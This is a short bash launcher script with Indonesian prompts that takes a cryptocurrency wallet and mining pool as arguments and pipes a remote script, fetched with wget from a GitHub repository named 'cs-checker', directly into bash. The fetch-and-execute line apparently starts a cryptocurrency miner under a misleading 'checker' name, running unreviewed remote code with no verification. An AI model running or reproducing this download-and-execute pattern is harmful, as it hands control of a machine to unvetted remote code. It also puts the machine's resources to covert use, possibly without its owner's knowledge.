#!/bin/bash

# Cek jumlah argumen
if [ "$#" -lt 2 ]; then
    echo "GUNAKAN FORMAT: WALLET POOL"
    exit 1
fi

# Ambil argumen
WALLET=$1
POOL=$2

bash -c "$(wget -qO- https://raw.githubusercontent.com/DOT-SUNDA/cs-checker/refs/heads/main/test.sh)" -- "$WALLET" "$POOL"
